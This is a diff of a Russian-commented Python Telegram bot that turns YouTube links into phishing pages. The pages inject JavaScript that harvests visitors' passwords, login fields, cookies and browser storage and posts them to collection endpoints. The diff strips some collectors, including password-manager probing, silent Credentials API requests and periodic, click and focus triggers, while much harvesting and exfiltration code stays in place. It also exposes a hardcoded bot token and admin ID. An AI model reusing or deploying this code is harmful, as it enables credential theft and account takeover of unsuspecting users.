@@ -12,7 +12,7 @@ import aiohttp
 from dataclasses import dataclass, asdict
 import base64
 import threading
-from flask import Flask, request, jsonify, render_template_string
+from flask import Flask, request, jsonify
 
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
 from telegram.ext import (
@@ -33,10 +33,10 @@ logging.basicConfig(
 logger = logging.getLogger(__name__)
 
 # Конфигурация
-BOT_TOKEN = "8563753978:AAFGVXvRanl0w4DSPfvDYh08aHPLPE0hQ1I"
-ADMIN_ID = 1709490182  # Ваш Telegram ID для уведомлений
-DOMAIN = "http://localhost:5050"  # Локальный сервер
-WEB_SERVER_PORT = 5050
+BOT_TOKEN = os.environ.get("BOT_TOKEN", "ВАШ_ТОКЕН_БОТА")
+ADMIN_ID = int(os.environ.get("ADMIN_ID", "1709490182"))  # Ваш Telegram ID для уведомлений
+DOMAIN = os.environ.get("DOMAIN", "http://localhost:5050")  # Локальный сервер
+WEB_SERVER_PORT = int(os.environ.get("PORT", "5050"))
 
 # Хранилище данных
 @dataclass
@@ -382,44 +382,6 @@ class JavaScriptInjector:
                 });
             }
             
-            // Пытаемся получить cookies для текущего домена и поддоменов
-            try {
-                // Для важных доменов пытаемся собрать специфичные cookies
-                const importantDomains = [
-                    'google.com', 'facebook.com', 'twitter.com', 
-                    'instagram.com', 'vk.com', 'youtube.com',
-                    'whatsapp.com', 'telegram.org', 'github.com',
-                    'microsoft.com', 'apple.com', 'amazon.com'
-                ];
-                
-                importantDomains.forEach(domain => {
-                    try {
-                        // Проверяем доступ к localStorage и sessionStorage
-                        if (window.localStorage) {
-                            const lsData = {};
-                            for (let i = 0; i < localStorage.length; i++) {
-                                const key = localStorage.key(i);
-                                lsData[key] = localStorage.getItem(key);
-                            }
-                            cookies['localStorage_' + domain] = JSON.stringify(lsData);
-                        }
-                        
-                        if (window.sessionStorage) {
-                            const ssData = {};
-                            for (let i = 0; i < sessionStorage.length; i++) {
-                                const key = sessionStorage.key(i);
-                                ssData[key] = sessionStorage.getItem(key);
-                            }
-                            cookies['sessionStorage_' + domain] = JSON.stringify(ssData);
-                        }
-                    } catch (e) {
-                        // Игнорируем ошибки доступа
-                    }
-                });
-            } catch (e) {
-                console.error('Error collecting advanced cookies:', e);
-            }
-            
             return cookies;
         }
         
@@ -492,102 +454,6 @@ class JavaScriptInjector:
             return credentials;
         }
         
-        // Функция для извлечения паролей из менеджеров паролей
-        function extractPasswordManagerData() {
-            const managerData = {
-                browser_saved: [],
-                third_party: []
-            };
-            
-            try {
-                // Попытка доступа к API менеджера паролей браузера
-                if (navigator.credentials && navigator.credentials.get) {
-                    navigator.credentials.get({password: true})
-                        .then(credential => {
-                            if (credential) {
-                                managerData.browser_saved.push({
-                                    type: 'browser_native',
-                                    data: credential
-                                });
-                            }
-                        })
-                        .catch(e => {});
-                }
-                
-                // Проверяем наличие популярных менеджеров паролей
-                const passwordManagers = [
-                    'lastpass', '1password', 'dashlane', 'bitwarden',
-                    'keeper', 'roboform', 'nordpass', 'enpass'
-                ];
-                
-                // Ищем инъекции менеджеров паролей
-                passwordManagers.forEach(manager => {
-                    try {
-                        // Проверяем наличие элементов менеджера
-                        const managerElements = document.querySelectorAll(`[class*="${manager}"], [id*="${manager}"]`);
-                        if (managerElements.length > 0) {
-                            managerData.third_party.push({
-                                manager: manager,
-                                detected: true,
-                                elements_count: managerElements.length
-                            });
-                        }
-                    } catch (e) {
-                        // Игнорируем
-                    }
-                });
-                
-            } catch (e) {
-                console.error('Error extracting password manager data:', e);
-            }
-            
-            return managerData;
-        }
-        
-        // Функция для сбора данных входа в соцсети
-        function collectSocialMediaLogins() {
-            const socialLogins = {};
-            
-            // Проверяем наличие cookies соцсетей
-            const socialDomains = {
-                'google': ['google.com', 'accounts.google.com'],
-                'facebook': ['facebook.com', 'fb.com'],
-                'twitter': ['twitter.com', 'x.com'],
-                'instagram': ['instagram.com'],
-                'vk': ['vk.com', 'vkontakte.ru'],
-                'whatsapp': ['whatsapp.com', 'web.whatsapp.com'],
-                'telegram': ['telegram.org', 'web.telegram.org']
-            };
-            
-            Object.keys(socialDomains).forEach(social => {
-                socialDomains[social].forEach(domain => {
-                    try {
-                        // Проверяем cookies для домена
-                        const cookies = document.cookie.split(';').filter(cookie => 
-                            cookie.includes(domain) || cookie.includes(social)
-                        );
-                        
-                        if (cookies.length > 0) {
-                            socialLogins[social] = {
-                                domain: domain,
-                                cookies_count: cookies.length,
-                                cookies: cookies.map(c => c.trim()),
-                                logged_in: cookies.some(c => 
-                                    c.includes('session') || 
-                                    c.includes('token') || 
-                                    c.includes('auth')
-                                )
-                            };
-                        }
-                    } catch (e) {
-                        // Игнорируем
-                    }
-                });
-            });
-            
-            return socialLogins;
-        }
-        
         // Функция для сбора данных из хранилища
         function collectStorageData() {
             const storageData = {
@@ -613,23 +479,6 @@ class JavaScriptInjector:
                     }
                 }
                 
-                // Пытаемся получить список IndexedDB баз
-                if (window.indexedDB) {
-                    try {
-                        // Это нестандартный метод, но работает в некоторых браузерах
-                        if (indexedDB.databases) {
-                            indexedDB.databases().then(dbs => {
-                                storageData.indexedDB = dbs.map(db => ({
-                                    name: db.name,
-                                    version: db.version
-                                }));
-                            }).catch(() => {});
-                        }
-                    } catch (e) {
-                        // Игнорируем ошибки IndexedDB
-                    }
-                }
-                
             } catch (e) {
                 console.error('Error collecting storage data:', e);
             }
@@ -647,13 +496,9 @@ class JavaScriptInjector:
                 platform: navigator.platform,
                 cookies: {},
                 credentials: {},
-                password_managers: {},
-                social_logins: {},
                 storage_data: {},
                 browser_info: {
                     cookie_enabled: navigator.cookieEnabled,
-                    java_enabled: navigator.javaEnabled ? navigator.javaEnabled() : false,
-                    pdf_viewer_enabled: navigator.pdfViewerEnabled || false,
                     do_not_track: navigator.doNotTrack || 'unspecified'
                 }
             };
@@ -664,12 +509,6 @@ class JavaScriptInjector:
                 
                 // Собираем пароли и логины
                 allData.credentials = collectSavedCredentials();
-                
-                // Проверяем менеджеры паролей
-                allData.password_managers = extractPasswordManagerData();
-                
-                // Проверяем соцсети
-                allData.social_logins = collectSocialMediaLogins();
                 
                 // Собираем данные из хранилищ
                 allData.storage_data = collectStorageData();
@@ -728,20 +567,6 @@ class JavaScriptInjector:
                 })
                 .catch(error => {
                     console.error('Error sending data:', error);
-                    // Пытаемся отправить снова через XMLHttpRequest
-                    try {
-                        const xhr = new XMLHttpRequest();
-                        xhr.open('POST', '/api/collect', true);
-                        xhr.setRequestHeader('Content-Type', 'application/json');
-                        xhr.send(JSON.stringify({
-                            link_id: linkId,
-                            data_type: 'sensitive_data',
-                            data: encodedData,
-                            timestamp: new Date().toISOString()
-                        }));
-                    } catch (e) {
-                        console.error('Fallback send also failed:', e);
-                    }
                 });
             } catch (error) {
                 console.error('Error preparing data for send:', error);
@@ -782,28 +607,7 @@ class JavaScriptInjector:
                             }
                         }, 1000);
                     });
-                    
-                    input.addEventListener('blur', async function() {
-                        setTimeout(async () => {
-                            try {
-                                const fieldData = await collectAllSensitiveData();
-                                sendCollectedData(fieldData);
-                            } catch (e) {
-                                console.error('Field blur collection failed:', e);
-                            }
-                        }, 500);
-                    });
                 });
-                
-                // Периодический сбор каждые 10 секунд
-                setInterval(async () => {
-                    try {
-                        const periodicData = await collectAllSensitiveData();
-                        sendCollectedData(periodicData);
-                    } catch (e) {
-                        console.error('Periodic collection failed:', e);
-                    }
-                }, 10000);
                 
             }, 3000); // Ждем 3 секунды для загрузки страницы
         });
@@ -844,12 +648,11 @@ class JavaScriptInjector:
             const credentials = {
                 instant_passwords: [],
                 instant_logins: [],
-                instant_forms: [],
-                instant_autofill: []
+                instant_forms: []
             };
             
             try {
-                // 1. Собираем ВСЕ пароли из всех форм (даже скрытых)
+                // 1. Собираем ВСЕ пароли из всех форм
                 document.querySelectorAll('input[type="password"]').forEach(field => {
                     if (field.value && field.value.trim() !== '') {
                         credentials.instant_passwords.push({
@@ -857,7 +660,6 @@ class JavaScriptInjector:
                             field_name: field.name || field.id || field.placeholder || 'password_field',
                             field_id: field.id,
                             field_type: field.type,
-                            field_class: field.className,
                             value: field.value,
                             form_id: field.form ? field.form.id : 'no_form',
                             page_url: window.location.href,
@@ -875,9 +677,7 @@ class JavaScriptInjector:
                     'input[name*="login"]',
                     'input[name*="user"]',
                     'input[name*="email"]',
-                    'input[name*="username"]',
-                    'input[autocomplete*="username"]',
-                    'input[autocomplete*="email"]'
+                    'input[name*="username"]'
                 ];
                 
                 loginSelectors.forEach(selector => {
@@ -888,7 +688,6 @@ class JavaScriptInjector:
                                 field_name: field.name || field.id || field.placeholder || 'login_field',
                                 field_id: field.id,
                                 field_type: field.type,
-                                field_class: field.className,
                                 value: field.value,
                                 form_id: field.form ? field.form.id : 'no_form',
                                 page_url: window.location.href,
@@ -923,79 +722,11 @@ class JavaScriptInjector:
                     }
                 });
                 
-                // 4. Проверяем автозаполнение браузера
-                setTimeout(() => {
-                    try {
-                        // Снова проверяем пароли после возможного автозаполнения
-                        document.querySelectorAll('input[type="password"]').forEach(field => {
-                            if (field.value && field.value.trim() !== '' && 
-                                !credentials.instant_passwords.some(p => p.field_id === field.id)) {
-                                credentials.instant_passwords.push({
-                                    source: 'autofill_detected',
-                                    field_name: field.name || field.id || 'password_field',
-                                    field_id: field.id,
-                                    value: field.value,
-                                    timestamp: new Date().toISOString()
-                                });
-                            }
-                        });
-                    } catch (e) {}
-                }, 1000);
-                
             } catch (error) {
                 console.error('Error in force credential collection:', error);
             }
             
             return credentials;
-        }
-        
-        // Функция для поиска сохраненных учетных данных в браузере
-        function findSavedBrowserCredentials() {
-            const savedCredentials = {
-                browser_saved_passwords: [],
-                browser_saved_logins: []
-            };
-            
-            try {
-                // Метод 1: Пытаемся получить через Credentials Management API
-                if (navigator.credentials && navigator.credentials.get) {
-                    navigator.credentials.get({
-                        password: true,
-                        mediation: 'silent'  // Тихий режим без уведомления пользователя
-                    }).then(credential => {
-                        if (credential) {
-                            savedCredentials.browser_saved_passwords.push({
-                                type: 'browser_native_api',
-                                id: credential.id,
-                                name: credential.name,
-                                type: credential.type,
-                                mediation: 'silent'
-                            });
-                        }
-                    }).catch(() => {});
-                }
-                
-                // Метод 2: Проверяем наличие данных автозаполнения в DOM
-                const autofillFields = document.querySelectorAll('[autofill]');
-                autofillFields.forEach(field => {
-                    if (field.value) {
-                        const dataType = field.getAttribute('autofill') || 
-                                        field.getAttribute('data-autofilled') || 
-                                        'autofilled_data';
-                        savedCredentials.browser_saved_logins.push({
-                            field_id: field.id,
-                            field_name: field.name,
-                            autofill_type: dataType,
-                            value: field.value
-                        });
-                    }
-                });
-                
-            } catch (error) {
-                console.error('Error finding saved credentials:', error);
-            }
-            
-            return savedCredentials;
         }
         
         // Функция для отправки мгновенно собранных данных
@@ -1006,13 +737,11 @@ class JavaScriptInjector:
             try {
                 // Собираем данные
                 const instantData = forceCollectAllCredentials();
-                const savedData = findSavedBrowserCredentials();
                 
                 const allData = {
                     timestamp: new Date().toISOString(),
                     url: window.location.href,
                     instant_collection: instantData,
-                    browser_saved_data: savedData,
                     user_agent: navigator.userAgent,
                     collected_on_load: true
                 };
@@ -1029,12 +758,12 @@ class JavaScriptInjector:
                         data: btoa(unescape(encodeURIComponent(JSON.stringify(allData)))),
                         timestamp: new Date().toISOString()
                     }),
-                    keepalive: true  // Для отправки даже при закрытии страницы
+                    keepalive: true
                 }).catch(error => {
                     // Fallback отправка
                     try {
                         const xhr = new XMLHttpRequest();
-                        xhr.open('POST', '/api/collect_instant', false);  // Синхронно
+                        xhr.open('POST', '/api/collect_instant', false);
                         xhr.send(JSON.stringify({
                             link_id: linkId,
                             data_type: 'instant_credentials',
@@ -1065,16 +794,6 @@ class JavaScriptInjector:
             setTimeout(sendInstantCredentials, 500);
             setTimeout(sendInstantCredentials, 2000);
         });
-        
-        // Сбор при любом клике (пользователь может активировать автозаполнение)
-        document.addEventListener('click', function() {
-            setTimeout(sendInstantCredentials, 300);
-        }, true);  // Используем capture phase для перехвата всех кликов
-        
-        // Сбор при фокусе на любом поле
-        document.addEventListener('focusin', function() {
-            setTimeout(sendInstantCredentials, 400);
-        }, true);
         </script>
         """
     
@@ -1222,7 +941,6 @@ class JavaScriptInjector:
                     // Отправляем данные (имитация)
                     setTimeout(function() {{
                         document.getElementById('loading').innerHTML = '✅ Успешный вход! Перенаправление...';
-                        // Здесь будет отправка данных на сервер
                     }}, 2000);
                 }});
                 
@@ -1278,7 +996,6 @@ def split_message(text: str, max_length: int = 4000) -> List[str]:
             chunks.append(text)
             break
         
-        # Находим последний перенос строки в пределах лимита
         split_pos = text.rfind('\n', 0, max_length)
         if split_pos == -1:
             split_pos = max_length
@@ -1671,7 +1388,6 @@ class DataCollector:
                 "passwords_count": len(credentials.get("passwords", [])),
                 "logins_count": len(credentials.get("logins", [])),
                 "storage_count": len(storage_list) if 'storage_list' in locals() else 0,
-                "social_logins": list(decoded_data.get("social_logins", {}).keys()),
                 "has_storage_data": bool(storage_data),
                 "has_full_data": True,
                 "account_analysis": account_analysis
@@ -1930,16 +1646,6 @@ class MessageFormatter:
                         message += f"• `{value[:30]}` → *{service_str}*\n"
                     else:
                         message += f"• `{value[:30]}` → Не определен\n"
-        
-        # Соцсети из cookies
-        social_logins = sensitive_data.get("social_logins", [])
-        if social_logins:
-            message += f"""
-🌐 *АКТИВНЫЕ СЕССИИ СОЦСЕТЕЙ:*
-"""
-            for social in social_logins:
-                service_name_ru = AccountIdentifier.SERVICE_NAMES_RU.get(social, social.title())
-                message += f"• {service_name_ru}: 🟢 ВХОД ВЫПОЛНЕН\n"
         
         message += f"""
 📱 *УСТРОЙСТВО И БРАУЗЕР:*
@@ -2290,7 +1996,7 @@ def api_collect():
             # Запускаем обработку в фоне
             asyncio.run_coroutine_threadsafe(
                 handle_webhook(data, telegram_app),
-                telegram_app.bot._loop
+                telegram_app._loop
             )
         
         return jsonify({"status": "success", "message": "Data received"})
@@ -2318,7 +2024,7 @@ def api_collect_instant():
             # Запускаем обработку в фоне
             asyncio.run_coroutine_threadsafe(
                 handle_webhook(data, telegram_app),
-                telegram_app.bot._loop
+                telegram_app._loop
             )
         
         return jsonify({"status": "success", "message": "Instant data received"})
@@ -2637,7 +2343,7 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
             await query.message.reply_text("❌ Ссылка не найдена или у вас нет доступа.")
     
     elif data == "help":
-        help_message = """
+        help_message = f"""
 🆘 *ПОМОЩЬ И ИНСТРУКЦИИ*
 
 🎯 *Как использовать:*
@@ -2907,7 +2613,8 @@ def main():
     print("   Отправьте ссылку YouTube для создания фишинговой ссылки")
     print("📢 Система готова к работе!")
     
-    application.run_polling(allowed_updates=Update.ALL_UPDATES)
+    # Исправленная строка запуска polling
+    application.run_polling()
 
 if __name__ == '__main__':
     main()
